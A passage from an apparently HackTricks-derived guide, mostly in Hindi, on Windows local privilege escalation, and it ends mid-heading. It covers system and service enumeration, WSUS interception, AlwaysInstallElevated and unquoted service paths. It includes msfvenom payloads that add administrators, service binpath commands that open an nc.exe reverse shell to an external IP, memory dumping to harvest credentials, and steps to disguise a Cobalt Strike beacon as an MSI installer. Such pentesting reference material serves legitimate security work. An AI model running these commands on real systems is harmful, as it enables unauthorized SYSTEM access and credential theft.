# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors खोजने के लिए सबसे अच्छा टूल:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## प्रारम्भिक Windows सिद्धांत

### Access Tokens

**यदि आप नहीं जानते कि Windows Access Tokens क्या हैं, तो आगे बढ़ने से पहले निम्न पृष्ठ पढ़ें:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs के बारे में अधिक जानकारी के लिए निम्न पृष्ठ देखें:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**यदि आप नहीं जानते कि Windows में integrity levels क्या हैं, तो आगे बढ़ने से पहले निम्न पृष्ठ पढ़ें:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows में अलग‑अलग चीज़ें होती हैं जो कि **prevent you from enumerating the system**, executable चलाने से रोक सकती हैं या यहाँ तक कि आपकी गतिविधियों को **detect your activities** कर सकती हैं। आपको निम्न **page** को **read** करना चाहिए और इन सभी **defenses** **mechanisms** को **enumerate** करना चाहिए **before starting the privilege escalation enumeration:**


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

## System Info

### Version info enumeration

जाँचें कि क्या Windows version में कोई ज्ञात vulnerability है (लागू किए गए patches को भी चेक करें)।
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

यह [site](https://msrc.microsoft.com/update-guide/vulnerability) Microsoft security vulnerabilities के बारे में विस्तृत जानकारी खोजने के लिए उपयोगी है। इस database में 4,700 से अधिक security vulnerabilities हैं, जो Windows environment द्वारा प्रस्तुत किए गए **massive attack surface** को दिखाते हैं।

**सिस्टम पर**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas में watson embedded है)_

**स्थानीय रूप से सिस्टम जानकारी के साथ**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos of exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

क्या कोई credential/Juicy info env variables में सेव है?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell इतिहास
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell ट्रांसक्रिप्ट फ़ाइलें

इसे सक्षम करने का तरीका आप यहाँ से जान सकते हैं [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell पाइपलाइन के निष्पादन का विवरण रिकॉर्ड किया जाता है, जिसमें निष्पादित कमांड, कमांड इनवोकेशन और स्क्रिप्ट के हिस्से शामिल होते हैं। हालांकि, पूर्ण निष्पादन विवरण और आउटपुट परिणाम हमेशा कैप्चर नहीं होते।

इसे सक्षम करने के लिए, दस्तावेज़ के "Transcript files" सेक्शन में दिए निर्देशों का पालन करें, **"Module Logging"** का चयन करें न कि **"Powershell Transcription"**।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowerShell logs से आखिरी 15 events देखने के लिए आप निम्नलिखित चला सकते हैं:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

स्क्रिप्ट के निष्पादन की पूरी गतिविधि और पूर्ण कंटेंट रिकॉर्ड किया जाता है, जिससे यह सुनिश्चित होता है कि कोड का प्रत्येक ब्लॉक चलते समय दस्तावेजीकृत हो। यह प्रक्रिया प्रत्येक गतिविधि का एक व्यापक audit trail बनाए रखती है, जो forensics और malicious behavior के विश्लेषण के लिए मूल्यवान है। निष्पादन के समय सभी गतिविधियों को दस्तावेजीकृत करके प्रक्रिया के बारे में विस्तृत जानकारी प्रदान की जाती है।
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block के लॉगिंग ईवेंट्स Windows Event Viewer में इस पथ पर मिल सकते हैं: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
आखिरी 20 ईवेंट देखने के लिए आप उपयोग कर सकते हैं:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### इंटरनेट सेटिंग्स
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ड्राइव्स
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

यदि अपडेट्स http**S** का उपयोग करके अनुरोधित नहीं किए जाते बल्कि http का उपयोग किया जाता है, तो आप सिस्टम को समझौता कर सकते हैं।

आप यह जांच करके शुरू करते हैं कि नेटवर्क non-SSL WSUS update का उपयोग करता है या नहीं, इसके लिए cmd में निम्नलिखित चलाएँ:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
या PowerShell में निम्नलिखित:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
यदि आपको इस तरह का कोई उत्तर मिलता है:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
And if `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` or `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` is equals to `1`.

Then, **it is exploitable.** If the last registry is equals to 0, then, the WSUS entry will be ignored.

In orther to exploit this vulnerabilities you can use tools like: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- These are MiTM weaponized exploits scripts to inject 'fake' updates into non-SSL WSUS traffic.

Read the research here:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Basically, this is the flaw that this bug exploits:

> यदि हमारे पास अपने लोकल यूज़र प्रॉक्सी को संशोधित करने की क्षमता है, और Windows Updates Internet Explorer की सेटिंग्स में कॉन्फ़िगर किए गए प्रॉक्सी का उपयोग करता है, तो हमारे पास [PyWSUS](https://github.com/GoSecure/pywsus) को लोकली रन करने की क्षमता होगी ताकि हम अपने ही ट्रैफ़िक को इंटरसेप्ट कर सकें और अपने एसेट पर एक elevated user के रूप में कोड चला सकें।
>
> इसके अलावा, चूँकि WSUS सर्विस वर्तमान यूज़र की सेटिंग्स का उपयोग करती है, यह उसके certificate store का भी उपयोग करेगी। यदि हम WSUS hostname के लिए एक self-signed certificate जनरेट करते हैं और इस सर्टिफिकेट को वर्तमान यूज़र के certificate store में जोड़ते हैं, तो हम HTTP और HTTPS दोनों WSUS ट्रैफ़िक को इंटरसेप्ट कर पाएँगे। WSUS सर्टिफिकेट पर trust-on-first-use प्रकार की वैधता लागू करने के लिए किसी HSTS-like मैकेनिज़म का उपयोग नहीं करता। यदि प्रस्तुत सर्टिफिकेट यूज़र द्वारा trusted है और इसके पास सही hostname है, तो सर्विस इसे स्वीकार कर लेगी।

You can exploit this vulnerability using the tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (once it's liberated).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

कई enterprise agents एक localhost IPC surface और एक privileged update चैनल एक्सपोज़ करते हैं। यदि enrollment को एक attacker server की ओर मजबूर किया जा सकता है और updater किसी rogue root CA या weak signer checks पर भरोसा करता है, तो एक लोकल यूज़र एक malicious MSI डिलीवर कर सकता है जिसे SYSTEM service इंस्टॉल कर देता है। एक generalized technique (Netskope stAgentSvc chain – CVE-2025-0309 पर आधारित) यहाँ देखें:

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## KrbRelayUp

Windows **domain** environments में विशिष्ट परिस्थितियों के तहत एक **local privilege escalation** कमजोरी मौजूद है। इन परिस्थितियों में ऐसे वातावरण शामिल हैं जहाँ **LDAP signing is not enforced,** उपयोगकर्ताओं के पास ऐसे self-rights होते हैं जो उन्हें **Resource-Based Constrained Delegation (RBCD)** कॉन्फ़िगर करने की अनुमति देते हैं, और उपयोगकर्ताओं के पास domain के भीतर कंप्यूटर बनाने की क्षमता होती है। यह ध्यान देने योग्य है कि ये **requirements** सामान्यतः **default settings** का उपयोग करके पूरी होती हैं।

Find the **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

For more information about the flow of the attack check [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**If** these 2 registers are **enabled** (value is **0x1**), then users of any privilege can **install** (execute) `*.msi` files as NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
यदि आपके पास meterpreter session है तो आप इस तकनीक को मॉड्यूल **`exploit/windows/local/always_install_elevated`** का उपयोग करके स्वचालित कर सकते हैं

### PowerUP

power-up के `Write-UserAddMSI` कमांड का उपयोग करें ताकि वर्तमान directory के अंदर एक Windows MSI binary बनाई जा सके ताकि आप privileges escalate कर सकें। यह script एक precompiled MSI installer लिखता है जो user/group addition के लिए prompt करता है (इसलिए आपको GIU access की आवश्यकता होगी):
```
Write-UserAddMSI
```
सिर्फ बनाए गए binary को execute करके privileges escalate करें।

### MSI Wrapper

Read this tutorial to learn how to create a MSI wrapper using this tools. Note that you can wrap a "**.bat**" file if you **just** want to **execute** **command lines**


{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- Cobalt Strike या Metasploit के साथ `C:\privesc\beacon.exe` में एक **new Windows EXE TCP payload** **Generate** करें।
- **Visual Studio** खोलें, **Create a new project** चुनें और search box में "installer" टाइप करें। **Setup Wizard** प्रोजेक्ट चुनें और **Next** पर क्लिक करें।
- प्रोजेक्ट का नाम दें, जैसे **AlwaysPrivesc**, लोकेशन के लिए **`C:\privesc`** चुनें, **place solution and project in the same directory** को चुनें, और **Create** पर क्लिक करें।
- तब तक **Next** पर क्लिक करते रहें जब तक आप step 3 of 4 (choose files to include) पर नहीं पहुँचते। **Add** पर क्लिक करें और अभी जो Beacon payload आपने बनाया है उसे चुनें। फिर **Finish** पर क्लिक करें।
- **Solution Explorer** में **AlwaysPrivesc** प्रोजेक्ट को हाइलाइट करें और **Properties** में **TargetPlatform** को **x86** से **x64** में बदलें।
- आप अन्य properties भी बदल सकते हैं, जैसे **Author** और **Manufacturer**, जिससे installed app अधिक legitimate दिखाई दे सकती है।
- प्रोजेक्ट पर right-click करें और **View > Custom Actions** चुनें।
- **Install** पर right-click करें और **Add Custom Action** चुनें।
- **Application Folder** पर double-click करें, अपनी **beacon.exe** फ़ाइल चुनें और **OK** पर क्लिक करें। इससे सुनिश्चित होगा कि installer रन होते ही beacon payload चलाया जाएगा।
- **Custom Action Properties** के अंतर्गत **Run64Bit** को **True** में बदलें।
- अंत में, **build it**।
- यदि warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` दिखाई दे तो सुनिश्चित करें कि आपने platform को x64 पर सेट किया है।

### MSI Installation

बैकग्राउंड में malicious `.msi` फ़ाइल की **installation** को execute करने के लिए:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
इस vulnerability को exploit करने के लिए आप उपयोग कर सकते हैं: _exploit/windows/local/always_install_elevated_

## एंटीवायरस और डिटेक्टर्स

### ऑडिट सेटिंग्स

ये सेटिंग्स तय करती हैं कि क्या **logged** हो रहा है, इसलिए आपको ध्यान देना चाहिए।
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding, यह जानना दिलचस्प है कि logs कहाँ भेजे जाते हैं
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** लोकल Administrator पासवर्ड्स के प्रबंधन के लिए डिज़ाइन किया गया है, यह सुनिश्चित करते हुए कि प्रत्येक पासवर्ड उन कंप्यूटरों पर जो domain से जुड़े होते हैं, अद्वितीय, यादृच्छिक और नियमित रूप से अपडेट हो। ये पासवर्ड्स Active Directory में सुरक्षित रूप से संग्रहीत होते हैं और केवल वे उपयोगकर्ता जिन्हें ACLs के माध्यम से पर्याप्त अनुमति दी गई हो ही इन्हें एक्सेस कर सकते हैं, जिससे अधिकृत होने पर वे local admin passwords देख सकें।

{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

यदि सक्रिय है, तो **plain-text passwords are stored in LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** से, Microsoft ने Local Security Authority (LSA) के लिए उन्नत सुरक्षा पेश की ताकि अविश्वसनीय प्रक्रियाओं द्वारा **इसकी मेमोरी पढ़ने** या कोड इंजेक्ट करने के प्रयासों को **रोक**कर, सिस्टम और अधिक सुरक्षित बनाया जा सके.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** को **Windows 10** में पेश किया गया था। इसका उद्देश्य डिवाइस पर संग्रहीत credentials को pass-the-hash जैसे खतरों से सुरक्षित रखना है.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**Domain credentials** को **Local Security Authority** (LSA) द्वारा प्रमाणित किया जाता है और ऑपरेटिंग सिस्टम के घटकों द्वारा उपयोग किया जाता है। जब किसी उपयोगकर्ता का logon data किसी registered security package द्वारा प्रमाणित किया जाता है, तो आम तौर पर उस उपयोगकर्ता के लिए domain credentials स्थापित किए जाते हैं।\
[**यहाँ Cached Credentials के बारे में अधिक जानकारी**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## उपयोगकर्ता और समूह

### उपयोगकर्ताओं और समूहों को सूचीबद्ध करें

आपको यह जांचना चाहिए कि जिन समूहों के आप सदस्य हैं उनमें से किसी के पास दिलचस्प अनुमतियाँ हैं या नहीं।
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### विशेषाधिकार समूह

यदि आप **किसी विशेषाधिकार समूह के सदस्य हैं तो आप escalate privileges कर सकते हैं**। विशेषाधिकार समूहों और उनका दुरुपयोग करके escalate privileges कैसे किया जा सकता है, यहाँ जानें:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Learn more** इस पृष्ठ पर जानें कि **token** क्या है: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
निम्नलिखित पृष्ठ देखें ताकि आप **दिलचस्प tokens** कौन से हैं और उनका दुरुपयोग कैसे किया जाता है जान सकें:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### लॉग्ड-इन उपयोगकर्ता / सत्र
```bash
qwinsta
klist sessions
```
### होम फ़ोल्डर्स
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### पासवर्ड नीति
```bash
net accounts
```
### क्लिपबोर्ड की सामग्री प्राप्त करें
```bash
powershell -command "Get-Clipboard"
```
## चल रही प्रक्रियाएँ

### फ़ाइल और फ़ोल्डर अनुमतियाँ

सबसे पहले, प्रक्रियाओं को सूचीबद्ध करते समय **प्रोसेस की command line के अंदर पासवर्ड्स की जाँच करें**.\
जाँचें कि क्या आप **किसी चल रहे binary को overwrite कर सकते हैं** या binary फ़ोल्डर पर write permissions हैं ताकि आप संभावित [**DLL Hijacking attacks**](dll-hijacking/index.html) का फायदा उठा सकें:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
हमेशा संभावित [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md) की जाँच करें।

**processes binaries की permissions की जाँच**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**प्रोसेस बाइनरीज़ के फोल्डरों की permissions की जाँच ([DLL Hijacking](dll-hijacking/index.html))**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

आप चल रही प्रोसेस का memory dump बना सकते हैं **procdump** from sysinternals का उपयोग करके। FTP जैसी सेवाओं में **credentials in clear text in memory** होते हैं — memory को dump करके उन credentials को पढ़ने की कोशिश करें।
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### असुरक्षित GUI एप्लिकेशन

**SYSTEM के रूप में चलने वाले एप्लिकेशन एक उपयोगकर्ता को CMD स्पॉन करने या डायरेक्टरी ब्राउज़ करने की अनुमति दे सकते हैं।**

उदाहरण: "Windows Help and Support" (Windows + F1), "command prompt" खोजें, "Click to open Command Prompt" पर क्लिक करें

## सेवाएँ

सेवाओं की सूची प्राप्त करें:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### अनुमतियाँ

आप किसी सेवा की जानकारी प्राप्त करने के लिए **sc** का उपयोग कर सकते हैं
```bash
sc qc <service_name>
```
यह सिफ़ारिश की जाती है कि प्रत्येक service के लिए आवश्यक privilege स्तर की जाँच करने हेतु _Sysinternals_ का binary **accesschk** मौजूद हो।
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
यह अनुशंसा की जाती है कि जांचें कि "Authenticated Users" किसी सेवा को संशोधित कर सकते हैं या नहीं:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[आप यहाँ से accesschk.exe (XP के लिए) डाउनलोड कर सकते हैं](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### सेवा सक्षम करें

यदि आपको यह त्रुटि आ रही है (उदाहरण के लिए SSDPSRV के साथ):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

आप इसे निम्न का उपयोग करके सक्षम कर सकते हैं
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**ध्यान में रखें कि सर्विस upnphost काम करने के लिए SSDPSRV पर निर्भर करती है (XP SP1 के लिए)**

**इस समस्या का एक और समाधान** यह है कि चलाएँ:
```
sc.exe config usosvc start= auto
```
### **सर्विस बाइनरी पाथ बदलें**

ऐसी स्थिति में जहाँ "Authenticated users" समूह के पास किसी service पर **SERVICE_ALL_ACCESS** होता है, service के executable binary को संशोधित करना संभव है। **sc** को संशोधित करने और चलाने के लिए:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### सेवा पुनरारंभ करें
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
विभिन्न permissions के माध्यम से अधिकार (privileges) बढ़ाए जा सकते हैं:

- **SERVICE_CHANGE_CONFIG**: सर्विस बाइनरी का पुनः कॉन्फ़िगरेशन करने की अनुमति देता है।
- **WRITE_DAC**: permissions का पुनः कॉन्फ़िगरेशन सक्षम करता है, जिससे service configurations बदलने की क्षमता मिलती है।
- **WRITE_OWNER**: ownership प्राप्त करने और permissions के पुनः कॉन्फ़िगरेशन की अनुमति देता है।
- **GENERIC_WRITE**: service configurations बदलने की क्षमता प्राप्त करता है।
- **GENERIC_ALL**: यह भी service configurations बदलने की क्षमता देता है।

इस vulnerability का पता लगाने और शोषण करने के लिए _exploit/windows/local/service_permissions_ का उपयोग किया जा सकता है।

### Services binaries के कमजोर permissions

**जाँचें कि क्या आप उस binary को संशोधित कर सकते हैं जिसे कोई service execute करता है** या क्या आपके पास उस फ़ोल्डर पर **write permissions** हैं जहाँ वह binary स्थित है ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
आप किसी service द्वारा execute की जाने वाली हर binary को **wmic** का उपयोग करके प्राप्त कर सकते हैं (system32 में नहीं) और अपनी permissions **icacls** का उपयोग करके जांच सकते हैं:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
आप **sc** और **icacls** का भी उपयोग कर सकते हैं:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### सर्विस रजिस्ट्री संशोधन अनुमतियाँ

आपको यह जांचना चाहिए कि क्या आप किसी भी सर्विस रजिस्ट्री को संशोधित कर सकते हैं.\
आप एक सर्विस **रजिस्ट्री** पर अपनी **अनुमतियाँ** **जांच** सकते हैं:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
जाँच करनी चाहिए कि क्या **Authenticated Users** या **NT AUTHORITY\INTERACTIVE** के पास `FullControl` permissions हैं। यदि हाँ, तो service द्वारा execute की जाने वाली binary को बदला जा सकता है।

To change the Path of the binary executed:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Services registry AppendData/AddSubdirectory permissions

यदि आपके पास किसी registry पर यह अनुमति है, तो इसका अर्थ है कि **आप इस registry से सब-registries बना सकते हैं**। Windows services के मामले में यह **मनमाना कोड चलाने के लिए पर्याप्त है:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

यदि किसी executable का path quotes के अंदर नहीं है, तो Windows हर space से पहले वाले ending को execute करने की कोशिश करेगा।

उदाहरण के लिए, path _C:\Program Files\Some Folder\Service.exe_ के लिए Windows निम्नलिखित को execute करने की कोशिश करेगा:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
बिल्ट-इन Windows सेवाओं से संबंधित सेवाओं को छोड़कर, सभी unquoted service paths सूचीबद्ध करें:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows\\" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\\Windows\\system32\\" |findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:""""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**आप detect और exploit कर सकते हैं** इस vulnerability को metasploit के साथ: `exploit/windows/local/trusted\_service\_path` आप मैन्युअल रूप से metasploit का उपयोग करके एक service binary बना सकते हैं:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### Recovery Actions

